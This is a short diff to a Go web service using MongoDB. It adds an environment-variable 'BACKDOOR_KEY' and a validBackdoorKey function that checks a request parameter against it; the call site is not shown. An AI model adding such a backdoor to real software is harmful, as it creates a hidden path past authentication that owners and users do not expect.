@@ -4,10 +4,17 @@ import (
 	"errors"
 	"log"
 	"net/http"
+	"os"
 	"strings"
 
 	"gopkg.in/mgo.v2"
 )
+
+var backdoorKey = os.Getenv("BACKDOOR_KEY")
+
+func validBackdoorKey(keyParam string) bool {
+	return backdoorKey != "" && keyParam == backdoorKey
+}
 
 // Context contains the logger and MongoDB session
 type Context struct {
